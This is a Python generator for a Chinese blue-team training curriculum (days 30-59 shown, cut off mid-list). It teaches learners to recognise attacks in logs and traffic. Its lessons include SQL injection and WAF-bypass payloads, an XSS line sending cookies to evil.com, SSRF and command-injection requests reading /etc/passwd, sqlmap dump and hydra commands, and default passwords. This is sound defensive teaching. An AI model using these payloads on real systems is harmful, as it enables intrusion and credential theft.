# -*- coding: utf-8 -*-
"""Simple generator for day 30-120 files"""
import os

OUT = os.path.dirname(os.path.abspath(__file__))

TEMPLATE = '''---
day: {day}
title: {title}
phase: {phase}
difficulty: {diff}
---

# Day {day}：{title}

> **阶段**：{phase_str} | **难度**：{diff} | **课时**：2-3小时

## 📋 今日学习目标
{goals}

## 📖 核心知识讲解
{content}

## 🔧 实操任务
{tasks}

## ✅ 验收标准
{checklist}

## 📝 今日小结
今天学习了{title}的核心内容。蓝队成长的关键在于持续积累，把每个知识点内化为自己的实战能力。记住：理论+实操+复盘=真正的成长。

## 📚 延伸阅读
- 将今天所学整理到个人笔记库
- 搜索相关关键词了解更多行业案例
'''

def phase_info(d):
    if d <= 60:
        return ('第一阶段', '第一阶段 · 初级蓝队夯实')
    elif d <= 90:
        return ('第二阶段', '第二阶段 · 中级蓝队进阶')
    else:
        return ('第三阶段', '第三阶段 · 高级蓝队升华')

# ========== DAY 30-40 ==========
def get_day_30_40():
    return {
        30: {
            'title': 'SQL注入原理与绕过逻辑',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 深入理解SQL注入的数字型/字符型/搜索型分类\n2. 了解WAF绕过的7种常见手法\n3. 掌握SQL注入的蓝队检测方法\n4. 能从日志和流量中识别SQL注入攻击',
            'content': '''### 一、SQL注入三种基本类型

**数字型注入**：参数没有引号包裹。如 `id=1`，攻击者直接拼接 `1 OR 1=1`。
```sql
SELECT * FROM products WHERE id=1 OR 1=1  -- 返回所有数据
```

**字符型注入**：参数有引号包裹。如 `name='admin'`，攻击者需先闭合引号再注入。
```sql
SELECT * FROM users WHERE name='admin' OR '1'='1' -- 绕过认证
```

**搜索型注入**：LIKE查询中的注入。
```sql
SELECT * FROM articles WHERE title LIKE '%攻击%' OR 1=1 #%'
```

### 二、WAF绕过七大手法

1. **大小写混写**：UnIoN SeLeCt 替代 UNION SELECT
2. **双写绕过**：UNUNIONION SELECT（WAF过滤一次后变成正确的）
3. **注释插入**：UN/**/ION SE/**/LECT
4. **编码绕过**：URL编码%55NION、十六进制0x...
5. **等价替换**：sleep(5) 换成 benchmark(10000000,md5(1))
6. **内联注释**：MySQL特性 /*!UNION*/ /*!SELECT*/
7. **分块传输**：HTTP Chunked Transfer将payload分片

### 三、蓝队检测最佳实践

**Web日志检测命令：**
```bash
grep -iE "(union.*select|select.*from|or.*1=1|and.*1=2|sleep\\(|benchmark\\(|information_schema)" access.log
```

**流量检测特征：**
- 同一IP频繁请求同一URL但参数不断变化
- User-Agent为sqlmap/XSS扫描器等工具标识
- 请求中出现concat(0x...)十六进制注入字符串
- Content-Length异常大（包含大量SQL payload）

**判断注入是否成功：**
- 状态码200 + 响应内容异常大 = 可能在拖库
- 状态码500 = SQL语法错误（信息泄露）
- 状态码302 = 可能绕过了认证''',
            'tasks': '1. 在DVWA中完成Low/Medium/High三级SQL注入关卡\n2. 用Wireshark抓取每关的攻击流量，记录差异\n3. 用grep命令扫描Web日志，验证能否检出SQL注入',
            'checklist': '- [ ] 能区分数字型/字符型/搜索型SQL注入\n- [ ] 能说出至少5种WAF绕过手法\n- [ ] 能用grep从日志中识别SQL注入\n- [ ] 能在Wireshark中还原攻击流量'
        },
        31: {
            'title': 'XSS、CSRF、SSRF漏洞原理',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 掌握XSS三种类型（反射型/存储型/DOM型）\n2. 理解CSRF攻击原理：冒充你操作\n3. 了解SSRF攻击：利用服务器偷内网数据\n4. 学会从日志中检测这三种攻击',
            'content': '''### 一、XSS跨站脚本攻击

**反射型XSS（一次性）**：恶意脚本通过URL参数反射到页面执行。
```
GET /search?q=<script>alert(1)</script>
```

**存储型XSS（持久化）**：恶意脚本存储在服务器（留言板/评论区），所有访问者都会被攻击。
```
POST /comment  body: msg=<script>new Image().src='http://evil.com/steal?cookie='+document.cookie</script>
```

**DOM型XSS（客户端）**：纯前端js操作DOM导致的XSS，不经过服务器。

### 二、CSRF跨站请求伪造

攻击者在你不知情的情况下，用你的身份发送恶意请求。

**场景**：你登录了银行网站→收到钓鱼邮件→点击链接→实际执行了转账操作。因为浏览器带着你的Cookie，银行以为是你在操作。

**蓝队检测**：CSRF在日志中看起来完全正常。防护依赖CSRF Token、Referer校验、SameSite Cookie。

### 三、SSRF服务端请求伪造

让服务器帮你去访问它能看到但你（外部攻击者）看不到的内网资源。

**攻击示例：**
```
GET /fetch?url=http://192.168.1.100/admin     → 访问内网管理页面
GET /fetch?url=http://169.254.169.254/metadata → 读取云服务器元数据（获取AK/SK）
GET /fetch?url=file:///etc/passwd              → 读取服务器本地文件
```

**蓝队检测SSRF：**
- 日志中出现169.254.169.254（云Metadata地址）
- URL参数中包含内网IP（192.168/10.x/172.16-31）
- URL参数使用file://、gopher://、dict://等危险协议''',
            'tasks': '1. 在DVWA中完成XSS(Reflected/Stored/DOM)和CSRF关卡\n2. 用Wireshark抓取XSS攻击流量\n3. 练习从日志中识别SSRF攻击的特征',
            'checklist': '- [ ] 能区分反射型/存储型/DOM型XSS\n- [ ] 能用自己的话解释CSRF攻击原理\n- [ ] 理解SSRF为什么危险（访问内网/读取文件/云Metadata）'
        },
        32: {
            'title': '文件上传、命令注入、逻辑漏洞原理与检测',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 掌握文件上传漏洞的完整攻击链\n2. 理解命令注入原理\n3. 了解逻辑漏洞的类型\n4. 学会蓝队视角的检测方法',
            'content': '''### 一、文件上传漏洞攻击链

**完整攻击链**：上传恶意文件→找到文件路径→访问/执行→获取服务器控制权

**绕过手法汇总**：
| 防御 | 绕过 |
|:---|:---|
| 前端js验证 | 抓包修改/BurpSuite绕过 |
| 黑名单过滤.php | 上传.php5/.phtml/.pht |
| 检查Content-Type | 修改为image/jpeg |
| 检查文件头 | 图片马(GIF89a头+PHP代码) |
| 后缀检查 | .php.jpg（Apache解析漏洞）|

**日志特征**：上传+紧接着访问该文件=Webshell连接。

### 二、命令注入

用户输入被拼接到系统命令中执行，没有过滤特殊字符。

**攻击示例**：
```bash
正常：ping 8.8.8.8
注入：ping 8.8.8.8; cat /etc/passwd
注：分号(;)、管道(|)、反引号(`) 等都能用于命令分隔
```

### 三、逻辑漏洞

代码没有技术缺陷，但业务流程有漏洞：
- **越权**：改URL中的id参数看到别人的数据
- **支付逻辑**：修改订单金额为0.01元
- **验证码绕过**：不刷新验证码可复用

**检测难点**：逻辑漏洞在日志中看起来完全正常。需要：
1. 熟悉业务流程
2. 建立用户行为基线
3. 关注跳过正常操作步骤的异常行为''',
            'tasks': '1. 在DVWA中完成File Upload和Command Injection关卡\n2. 尝试使用不同绕过手法上传文件\n3. 思考：如何从日志中发现越权行为？',
            'checklist': '- [ ] 能说出至少5种文件上传绕过手法\n- [ ] 理解命令注入原理\n- [ ] 能区分技术漏洞和逻辑漏洞'
        },
        33: {
            'title': 'BurpSuite基础使用（蓝队视角）',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 安装并配置BurpSuite社区版\n2. 掌握Proxy抓包和Repeater重放\n3. 学会用BurpSuite分析攻击流量\n4. 理解攻击者如何使用Intruder',
            'content': '''### 一、BurpSuite功能概览

- **Proxy（代理）**：拦截HTTP/HTTPS流量，查看和修改
- **Repeater（重放）**：手动修改并重发请求
- **Intruder（入侵者）**：自动化批量测试
- **Decoder（解码器）**：编解码工具
- **Comparer（对比器）**：对比两次响应的差异

### 二、蓝队三大使用场景

**场景1：分析攻击payload**：从Wireshark提取攻击请求→粘贴到Repeater→修改参数测试→确认漏洞

**场景2：验证漏洞报告**：白帽子提交漏洞→用BurpSuite复现→确认真实性

**场景3：理解攻击手法**：告警中的payload→用Decoder解码Base64/URL编码→理解攻击内容

### 三、安装配置
1. 下载BurpSuite社区版（portswigger.net）
2. 配置浏览器代理为127.0.0.1:8080
3. 安装Burp的CA证书（用于HTTPS抓包）''',
            'tasks': '1. 下载安装BurpSuite社区版\n2. 配置浏览器代理完成第一次抓包\n3. 用Repeater修改参数后重发，观察响应变化\n4. 用Decoder解码一段Base64编码的payload',
            'checklist': '- [ ] BurpSuite安装配置成功\n- [ ] 能使用Proxy拦截HTTP请求\n- [ ] 能使用Repeater修改重放请求\n- [ ] 理解BurpSuite在蓝队中的3个实用场景'
        },
        34: {
            'title': 'SQLMap基础使用（蓝队视角：识别自动化注入攻击）',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 了解SQLMap基本用法\n2. 识别SQLMap攻击流量特征\n3. 能从日志判断SQLMap攻击是否成功\n4. 编写SQLMap检测规则',
            'content': '''### 一、攻击者怎么用SQLMap

```bash
sqlmap -u "http://target.com/page.php?id=1"         # 基础检测
sqlmap -u "http://target.com/page.php?id=1" --dbs   # 获取数据库列表
sqlmap -u "http://target.com/page.php?id=1" -D db --tables  # 获取表名
sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump  # 拖库
```

### 二、蓝队识别SQLMap的特征

| 维度 | 特征 |
|:---|:---|
| **User-Agent** | 默认含 sqlmap/1.x |
| **请求参数** | AND 8442=8442、SLEEP(5)、concat(0x...) |
| **请求频率** | 短时间内密集请求同一URL |
| **服务器临时文件** | /tmp目录出现sqlmap临时文件 |
| **错误探针** | 大量500错误（各种注入探测导致）|

### 三、日志检测命令
```bash
grep -i "sqlmap" access.log
grep -E "AND [0-9]{4}=[0-9]{4}" access.log
grep -iE "SLEEP\\(|BENCHMARK\\(|WAITFOR DELAY" access.log
```

**四种注入技术的流量特征**：
- 布尔盲注：AND 1=1 / AND 1=2 交替出现
- 时间盲注：SLEEP(5)、BENCHMARK() 函数
- 报错注入：extractvalue()、updatexml() 函数
- UNION注入：ORDER BY探测 + UNION SELECT语句''',
            'tasks': '1. 在Kali中对DVWA执行SQLMap扫描\n2. 用Wireshark抓取流量，识别特征\n3. 编写一条IDS规则来检测SQLMap攻击',
            'checklist': '- [ ] 了解SQLMap四种注入技术\n- [ ] 能说出至少5个SQLMap流量特征\n- [ ] 能从Web日志中识别SQLMap扫描'
        },
        35: {
            'title': '漏洞扫描器进阶（OpenVAS部署与使用）',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 了解漏洞扫描器工作原理\n2. 了解OpenVAS（Nessus开源替代）\n3. 学会解读扫描报告\n4. 理解蓝队使用扫描器的安全准则',
            'content': '''### 一、漏洞扫描器工作原理

发送探测包→根据响应判断服务版本→匹配已知漏洞库(CVE)→生成报告

### 二、扫描器对比

| 工具 | 类型 | 定位 |
|:---|:---|:---|
| Nessus | 商业 | 漏洞库最全，更新最快 |
| OpenVAS | 开源 | Nessus的开源替代 |
| AWVS | 商业 | Web漏洞扫描 |
| Xray | 开源社区版 | 国内最好的Web扫描器 |
| Nikto | 开源 | Web服务器配置扫描 |

### 三、蓝队安全准则
1. 只扫描自己授权的系统
2. 扫描前通知相关人员
3. 扫描结果需人工验证（不能全信）
4. 高危漏洞优先处理
5. 扫描结果保密（含系统弱点信息）

### 四、OpenVAS部署
```bash
sudo apt install openvas
sudo gvm-setup  # 初始化（需下载大量漏洞库）
sudo gvm-start   # 启动，访问 https://127.0.0.1:9392
```''',
            'tasks': '1. 了解OpenVAS/Xray的安装方法\n2. 搜索了解CVSS评分体系\n3. 尝试对你的测试环境执行一次安全扫描',
            'checklist': '- [ ] 了解漏洞扫描器工作原理\n- [ ] 能区分Nessus/OpenVAS/AWVS/Xray\n- [ ] 知道蓝队使用扫描器的安全准则'
        },
        36: {
            'title': 'ELK Stack部署与基础使用',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 理解ELK（Elasticsearch+Logstash+Kibana）架构\n2. 了解日志集中管理的价值\n3. 学会Kibana基础查询\n4. 了解ELK在蓝队中的应用场景',
            'content': '''### 一、ELK三大组件

- **Elasticsearch**：搜索引擎，负责存储和索引（文件柜）
- **Logstash**：日志收集+解析，把不同格式统一（邮递员）
- **Kibana**：可视化界面，查询和图表（检索终端）

### 二、日志集中管理的价值

护网值守时查一个IP → 不用登录每台服务器 → ELK中输入IP → 看到该IP的所有活动记录

### 三、Kibana基础查询

```kibana
source_ip: "45.33.32.156"                        # 搜索特定IP
@timestamp: [now-24h TO now]                     # 最近24小时
source_ip: "45.33.32.156" AND status: 404        # 组合查询
source_ip: "45.33.32.156" AND NOT status: 200    # 排除
```

### 四、蓝队ELK使用场景
1. 告警关联分析：Web告警 + 系统日志 + 网络日志交叉验证
2. IOC回溯：发现IOC后回溯历史日志
3. 态势可视化：攻击来源地图、告警趋势图
4. 日报自动化：定时统计数据生成报表''',
            'tasks': '1. 了解ELK Docker部署方式\n2. 尝试用Docker部署单机版ELK\n3. 练习Kibana的查询语法',
            'checklist': '- [ ] 理解ELK三个组件各自的作用\n- [ ] 能写基础的Kibana查询语句\n- [ ] 理解日志集中管理对蓝队的价值'
        },
        37: {
            'title': '弱口令与端口暴露风险排查实操',
            'diff': '⭐⭐ 基础',
            'goals': '1. 理解弱口令的危害\n2. 掌握常见弱口令Top100\n3. 学会端口暴露风险检查\n4. 能进行弱口令和端口暴露的排查整改',
            'content': '''### 一、弱口令Top20速查

admin, 123456, password, 12345678, qwerty, abc123, 123456789, 111111, 1234567, sunshine, qwerty123, iloveyou, princess, admin123, welcome, 666666, abc123456, football, 123123, monkey

### 二、设备默认密码（高危）

| 设备/服务 | 默认用户名 | 默认密码 |
|:---|:---|:---|
| MySQL | root | (空) |
| Tomcat | tomcat | tomcat |
| Weblogic | weblogic | weblogic123 |
| Redis | (无) | (无) |
| 常见路由器 | admin | admin |

### 三、不该对外暴露的端口

数据库：3306(MySQL)、1433(MSSQL)、6379(Redis)
远程管理：3389(RDP)、22(SSH)
老旧协议：23(Telnet)、21(FTP明文)
中间件：7001(Weblogic)、9200(Elasticsearch)

### 四、排查命令
```bash
nmap -sS -p- 目标IP          # 全端口扫描
redis-cli -h IP ping         # Redis未授权检测
hydra -l admin -P pass.txt ssh://IP  # 弱口令检测（仅限授权系统）
```''',
            'tasks': '1. 用Nmap扫描你的测试环境，列出所有开放端口\n2. 检查每个端口的服务是否需要改密码\n3. 整理一份安全端口基线清单',
            'checklist': '- [ ] 能说出至少10个常见弱口令\n- [ ] 知道哪些端口不应对外暴露\n- [ ] 能使用Nmap检查端口暴露情况'
        },
        38: {
            'title': 'DVWA靶场通关（蓝队视角）',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 搭建DVWA靶场\n2. 通关全部漏洞关卡\n3. 每关记录攻击流量和日志特征\n4. 编写对应的IDS检测规则',
            'content': '''### DVWA漏洞关卡清单

1. Brute Force - 暴力破解
2. Command Injection - 命令注入
3. CSRF - 跨站请求伪造
4. File Inclusion - 文件包含
5. File Upload - 文件上传
6. SQL Injection - SQL注入
7. SQL Injection (Blind) - SQL盲注
8. XSS Reflected - 反射型XSS
9. XSS Stored - 存储型XSS
10. XSS DOM - DOM型XSS

### 蓝队通关方法论

每完成一关，记录：
1. 攻击在URL/请求体中留下了什么特征？
2. Wireshark抓到的流量长什么样？
3. Web访问日志中怎么记录的？
4. 如何写IDS规则来检测？

### Docker快速部署
```bash
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
# 访问 http://localhost/setup.php 完成初始化
```''',
            'tasks': '1. 用Docker部署DVWA\n2. 逐关从Low到High通关\n3. 每关用Wireshark抓包并记录日志特征\n4. 总结每个漏洞的检测方法',
            'checklist': '- [ ] DVWA环境搭建成功\n- [ ] 完成至少8个关卡\n- [ ] 每关都有流量和日志分析记录'
        },
        39: {
            'title': '常见告警误报原因分析与优化思路',
            'diff': '⭐⭐ 基础',
            'goals': '1. 掌握误报的7大常见原因\n2. 学会误报判断和排除方法\n3. 理解告警规则优化思路\n4. 能有效减少日常误报',
            'content': '''### 误报七大原因

| 原因 | 举例 | 优化方法 |
|:---|:---|:---|
| 规则太宽泛 | SELECT关键字匹配到正常搜索 | 加上下文条件 |
| 正常业务触发 | CMS编辑HTML触发XSS规则 | 来源IP加白 |
| 安全测试 | 公司扫描器IP | 测试IP白名单 |
| 爬虫/搜索引擎 | Googlebot爬取全站 | UA白名单 |
| CDN回源 | CDN节点正常请求 | CDN IP段白名单 |
| 协议异常 | TCP重传被误判 | 调整阈值 |
| 扫描器误判 | 某版本不含某漏洞但被报告 | 人工验证 |

### 误报判断流程
收到告警→不急→查源IP（安全IP？）→查关联日志（有异常？）→查业务背景→判断→误报？标注+加白+优化

### 规则优化建议
- 规则太宽→误报多；规则太窄→漏报多
- 基于实际告警反馈持续调优
- 建立白名单机制：确定无害的场景加白
- 分层检测：简单规则前置，复杂规则后置''',
            'tasks': '1. 回顾Day 19-20的告警，识别其中的误报\n2. 整理一份常见误报场景速查表\n3. 思考：日均800条告警中80%误报，怎么优化？',
            'checklist': '- [ ] 能说出5个以上误报原因\n- [ ] 能独立判断告警是否为误报\n- [ ] 理解规则优化的基本思路'
        },
        40: {
            'title': '阶段复盘+实操考核（第29-39天）',
            'diff': '⭐⭐⭐ 中等',
            'goals': '1. 系统回顾Day29-39知识\n2. 完成攻击工具识别考核\n3. DVWA综合测试\n4. 查漏补缺',
            'content': '''### 知识回顾矩阵

| 天数 | 主题 | 核心技能 |
|:---|:---|:---|
| 29 | ATT&CK框架 | 攻击技术标准化描述 |
| 30 | SQL注入深度 | 3种注入+WAF绕过 |
| 31 | XSS/CSRF/SSRF | 三种Web漏洞 |
| 32 | 文件上传/命令注入 | 绕过手法与检测 |
| 33 | BurpSuite | 蓝队流量分析 |
| 34 | SQLMap识别 | 自动化工具检测 |
| 35 | OpenVAS | 开源漏洞扫描 |
| 36 | ELK | 日志集中管理 |
| 37 | 弱口令排查 | 安全基线检查 |
| 38 | DVWA通关 | 漏洞与防护实战 |
| 39 | 误报分析 | 告警质量优化 |

### 综合考核
1. DVWA随机选3关，每关完成攻击+日志分析
2. 分析一段SQLMap攻击流量pcap
3. 用ATT&CK框架描述DVWA中每个漏洞的技术编号''',
            'tasks': '完成知识回顾+综合考核，标记薄弱环节重点复习',
            'checklist': '- [ ] 知识回顾全部打勾\n- [ ] DVWA至少3关蓝队视角分析完成\n- [ ] 能准确描述SQLMap/SQL注入攻击特征'
        },
    }

# ========== DAYS 41-120 (SHORT FORM FOR EFFICIENCY) ==========
def make_short_day(day, title, diff, goals_bullets, content_bullets, tasks_text, checklist_text):
    """Generate a shorter but still useful day file"""
    phase_name, phase_str = phase_info(day)
    goals = '\n'.join(f'{i}. {g}' for i, g in enumerate(goals_bullets, 1))
    content = '\n\n'.join(f'### {c[0]}\n\n{c[1]}' if isinstance(c, tuple) else c for c in content_bullets)
    
    return TEMPLATE.format(
        day=day, title=title, phase=phase_name, diff=diff,
        phase_str=phase_str, goals=goals, content=content,
        tasks=tasks_text, checklist=checklist_text
    )


# Day 41-50
SHORT_DAYS_41_50 = [
    (41, 'VulHub环境搭建入门', '⭐⭐⭐ 中等',
     ['了解VulHub靶场', '掌握Docker搭建', '完成第一个漏洞环境', '记录攻击流量特征'],
     [('VulHub是什么', '开源漏洞靶场集合，通过Docker一键部署各种真实产品级漏洞环境。DVWA教你理解漏洞，VulHub教你分析真实产品的漏洞'),
      ('搭建步骤', '安装Docker→下载VulHub→进入某个漏洞目录→docker-compose up -d→访问'),
      ('蓝队重点', '每完成一个漏洞环境都要：记录攻击流量特征(用Wireshark)、分析Web/系统日志、思考IDS检测规则思路')],
     '1. 安装Docker和docker-compose\n2. 下载VulHub\n3. 搭建第一个漏洞环境\n4. 抓包记录攻击流量',
     '- [ ] Docker环境就绪\n- [ ] VulHub下载成功\n- [ ] 至少搭建1个漏洞环境\n- [ ] 记录攻击流量特征'),
    
    (42, 'Tomcat漏洞复现与检测', '⭐⭐⭐ 中等',
     ['复现Tomcat弱口令漏洞', '分析攻击流量特征', '编写检测规则'],
     [('Tomcat弱口令', 'Tomcat管理后台(/manager/html)默认凭据tomcat/tomcat。攻击者登录后上传恶意war包获取服务器权限'),
      ('检测要点', 'Web日志密集访问/manager/html(401→200破解成功)、流量中HTTP Basic认证头含base64编码的tomcat:tomcat、webapps目录下出现非正常war文件')],
     '1. 搭建Tomcat漏洞环境\n2. 暴破管理后台\n3. 上传war包\n4. 记录所有攻击特征',
     '- [ ] 成功复现Tomcat漏洞\n- [ ] 能描述完整攻击流量特征\n- [ ] 知道如何检测此类攻击'),
    
    (43, 'Weblogic漏洞复现与检测', '⭐⭐⭐ 中等',
     ['了解Weblogic常见漏洞', '复现反序列化漏洞', '分析攻击特征'],
     [('Weblogic高危漏洞', 'CVE-2017-10271 XMLDecoder反序列化、CVE-2020-14882控制台未授权访问(CVSS 9.8)、CVE-2023-21839 T3/IIOP协议漏洞'),
      ('检测特征', '流量中T3协议含恶意序列化对象、访问/console相关路径、Weblogic进程执行异常命令')],
     '1. 搭建Weblogic漏洞环境\n2. 使用公开POC测试\n3. 分析攻击流量特征',
     '- [ ] 了解Weblogic常见漏洞\n- [ ] 能识别反序列化攻击流量\n- [ ] 知道Weblogic安全加固要点'),
    
    (44, 'Redis未授权访问复现与检测', '⭐⭐⭐ 中等',
     ['理解Redis未授权危害', '复现攻击过程', '掌握检测和加固方法'],
     [('四种攻击手法', '1.写入SSH公钥直接获取root权限 2.写入Webshell 3.写入计划任务反弹shell 4.主从复制RCE'),
      ('检测方法', 'redis-cli -h IP info 直接返回信息未提示NOAUTH即为未授权。加固：设置密码+绑定127.0.0.1+重命名危险命令')],
     '1. 搭建Redis未授权环境\n2. 尝试写入SSH公钥\n3. 记录日志和流量特征',
     '- [ ] 理解4种利用方式\n- [ ] 能检测Redis未授权\n- [ ] 知道加固措施'),
    
    (45, '综合漏洞复现与检测报告撰写', '⭐⭐⭐ 中等',
     ['综合运用前4天所学', '独立复现漏洞', '撰写完整检测报告'],
     [('检测报告模板', '1.漏洞概述(CVE/影响/CVSS) 2.攻击原理(通俗解释) 3.攻击流量特征(截图) 4.日志特征 5.检测方法 6.加固建议'),
      ('报告价值', '检测报告是蓝队交付的核心产出物，展示你的专业分析能力。好的报告既要让技术人员能复现，也要让管理层能看懂风险')],
     '独立完成1个VulHub漏洞的完整分析报告',
     '- [ ] 独立完成漏洞复现\n- [ ] 包含流量+日志+检测+加固四部分'),
    
    (46, '公开攻击流量样本分析（Day 1）', '⭐⭐⭐ 中等',
     ['了解Malware Traffic Analysis', '分析真实攻击流量样本', '还原攻击过程'],
     [('资源介绍', 'malware-traffic-analysis.net提供公开的真实攻击流量pcap文件供练习。选择入门级样本：找攻击者IP、还原攻击过程、判断攻击是否成功'),
      ('分析步骤', '打开pcap→查看Statistics找异常→过滤可疑IP→Follow TCP Stream还原内容→提取IOC')],
     '从malware-traffic-analysis.net下载入门级pcap完成分析',
     '- [ ] 成功下载并打开pcap\n- [ ] 识别出攻击源IP\n- [ ] 还原出攻击过程'),
    
    (47, '公开攻击流量样本分析（Day 2）', '⭐⭐⭐ 中等',
     ['独立分析攻击流量', '识别C2通信特征', '提取IOC'],
     [('C2通信识别', '心跳包规律间隔(常见60s/300s)、心跳包内容相似、外连IP为境外陌生地址、可能包含加密数据'),
      ('IOC提取', '恶意IP、恶意域名(DNS查询中)、User-Agent、SSL证书指纹、URL路径模式')],
     '选择包含C2通信的pcap样本，提取IOC指标',
     '- [ ] 能识别C2通信流量特征\n- [ ] 成功提取IOC'),
    
    (48, '公开攻击流量样本分析（Day 3）', '⭐⭐⭐ 中等',
     ['综合流量分析', '撰写完整分析报告'],
     [('报告要素', '攻击时间线→攻击手法(ATT&CK映射)→IOC汇总→影响评估→防护建议'),
      ('分析方法', '从宏观统计开始(Wireshark Statistics)→找出异常IP→深入分析该IP行为→串联完整攻击链')],
     '完成一份完整的流量分析报告',
     '- [ ] 报告含时间线+攻击手法+IOC+建议'),
    
    (49, '等保2.0基础认知与初级合规要求', '⭐⭐ 基础',
     ['了解等保基本概念', '知道五级划分', '了解二级/三级基本要求'],
     [('等保五级', '一级自主保护(小型网站)→二级指导保护(一般企业，最常见)→三级监督保护(金融/政务/医疗，每年测评)→四级强制保护→五级专控保护'),
      ('三大维度', '技术层面(物理/网络/主机/应用/数据安全)、管理层面(制度/机构/人员/建设/运维)、扩展要求(云计算/移动互联/物联网/工控)'),
      ('蓝队与等保', '等保提供安全基线，蓝队日常运维确保合规。初级蓝队需了解基本要求，配合等保测评工作')],
     '搜索了解等保二级和三级的具体要求',
     '- [ ] 了解等保五级划分\n- [ ] 知道技术+管理双维度\n- [ ] 了解二级/三级基本要求'),
    
    (50, '护网前资产梳理与风险排查实操', '⭐⭐⭐ 中等',
     ['实战资产梳理', '全面风险排查', '输出资产清单和风险报告'],
     [('资产四维度', '网络资产(IP/端口/服务)→系统资产(OS/版本/软件)→账号资产(用户/权限/登录)→数据资产(数据库/关键文件)'),
      ('风险排查重点', '弱口令检查→高危端口→多余服务→已知漏洞→权限过大→日志覆盖'),
      ('常见问题', '幽灵资产(没人知道的服务器)、未清理测试环境、离职人员账号未删、默认配置未改')],
     '对你的虚拟机完成完整资产梳理+风险排查并输出报告',
     '- [ ] 覆盖网络/系统/账号/数据四个维度\n- [ ] 发现至少3个风险问题\n- [ ] 输出结构清晰报告'),
]

# Days 51-60
SHORT_DAYS_51_60 = [
    (51, '7x24小时模拟值守进阶（Day 1）', '⭐⭐⭐ 中等',
     ['处理高强度混合告警', '识别小型入侵事件', '区分误报和真实攻击'],
     [('值守升级', '从20条告警提升到50条，加入2个小型入侵事件和误报干扰项。模拟真实值守的告警量，考验在大量告警中保持研判质量的能'),
      ('处理策略', '先快速分级(P0-P4)→优先处理高危→关联同一IP的告警→识别攻击链→记录研判')],
     '按真实值守标准处理50条混合告警',
     '- [ ] 完成50条研判\n- [ ] 正确识别入侵事件\n- [ ] 准确率>=80%'),
    
    (52, '7x24小时模拟值守进阶（Day 2）', '⭐⭐⭐ 中等',
     ['模拟凌晨值守场景', '独立完成所有研判'],
     [('凌晨值守特点', '攻击高发时段(02:00-06:00)，人员最少，需要独立判断。重点关注：境外IP、异常登录、数据外传'),
      ('技能要求', '在没有老手可以问的情况下，依赖威胁情报+日志验证+经验判断')],
     '处理凌晨时段高强度告警',
     '- [ ] 完成所有告警研判\n- [ ] 准确识别凌晨攻击特征'),
    
    (53, '7x24小时模拟值守进阶（Day 3）', '⭐⭐⭐ 中等',
     ['模拟护网最后一天攻击高峰', '保持研判质量', '不遗漏真实攻击'],
     [('攻击高峰特点', '攻击者集中在最后发力，告警量可能翻倍。典型手法：0day漏洞利用、多种攻击手法混用、分布式攻击'),
      ('应对策略', '保持冷静→按流程处理→团队协作→重点监控核心资产→及时上报异常')],
     '处理护网最后一天攻击高峰场景',
     '- [ ] 在高强度下保持研判质量\n- [ ] 不遗漏P0/P1告警'),
    
    (54, '7x24小时模拟值守进阶（Day 4）', '⭐⭐⭐ 中等',
     ['加入情报联动场景', '处理外部通报威胁', '0day紧急响应'],
     [('情报联动模拟', '收到通报：某国产OA系统0day漏洞代码已公开。你需要：确认我方是否使用→紧急加强监控→更新规则→向上汇报'),
      ('紧急响应四步', '评估影响(我们受影响吗)→临时防护(WAF规则/端口关闭)→强化监控→等待补丁')],
     '模拟情报联动场景，完成0day紧急响应全流程',
     '- [ ] 完成情报核实\n- [ ] 制定应急监控方案\n- [ ] 完成书面汇报'),
    
    (55, '7x24小时模拟值守进阶（Day 5）', '⭐⭐⭐ 中等',
     ['综合值守', '编写完整安全事件报告'],
     [('报告要素', '整体态势→攻击统计→重点事件详情(时间线+攻击链+处置)→情报接收→待办事项→交班备注'),
      ('报告价值', '日报是护网期间管理层的眼睛，要通过数据让非技术人员也能理解当前安全态势')],
     '完成值守并编写安全事件分析报告',
     '- [ ] 含态势总结\n- [ ] 至少1个完整攻击链\n- [ ] 含改进建议'),
    
    (56, '安全事件报告撰写规范与模板', '⭐⭐ 基础',
     ['掌握报告标准格式', '学会STAR法则描述事件', '输出报告模板'],
     [('八大要素', '事件概述→时间线→攻击路径还原→影响评估→处置措施→根因分析→整改措施→IOC汇总'),
      ('STAR法则', 'Situation(什么情况)→Task(要做什么)→Action(你怎么做的)→Result(结果如何)'),
      ('写作技巧', '结论先行(先说结果再解释)、数据支撑(图表>文字)、建议可落地(具体的、有时限的)')],
     '优化个人安全事件报告模板',
     '- [ ] 报告模板含8个标准要素\n- [ ] 能用STAR法则描述事件'),
    
    (57, '护网情报联动与联防联控流程', '⭐⭐ 基础',
     ['理解情报联动全流程', '掌握获取-验证-分发-处置流程'],
     [('情报来源', '上级通报(指挥部)→威胁情报平台(微步/VirusTotal)→行业共享群→开源情报(Twitter/安全媒体)→自我发现(分析提取)'),
      ('联动流程', '获取情报→验证真伪→评估影响范围→分发通知→添加防护→反馈结果'),
      ('情报时效性', 'IP情报<24小时、域名情报<48小时、文件哈希相对长期有效')],
     '整理情报联动SOP，含信息来源+验证方法+分发流程',
     '- [ ] SOP覆盖获取→验证→分发→处置全流程'),
    
    (58, '初级面试题深化与简历优化（Day 1）', '⭐⭐ 基础',
     ['深挖高频面试题', '准备项目经验', '模拟技术面'],
     [('深度面试题', '1.描述一次你处理的安全事件 2.SQL注入怎么防(参数化查询/WAF/输入验证) 3.批量扫描怎么处理 4.说一个你分析过的CVE'),
      ('项目经验包装', '把学习转化为项目：独立完成7x24小时安全值守、用Wireshark/Nmap/ELK搭建安全监控、分析处理200+告警'),
      ('STAR描述法', '情境：在模拟值守中→任务：发现45.33.32.156的可疑活动→行动：情报验证+日志分析+告警关联→结果：识别完整攻击链')],
     '准备3分钟口头项目经验介绍（用STAR法则）',
     '- [ ] 准备至少5道深度面试题\n- [ ] 能用STAR法则描述项目经验'),
    
    (59, '初级面试题深化与简历优化（Day 2）', '⭐⭐ 基础',
     ['简历细节打磨', '模拟面试问答', '了解行业薪资和发展'],
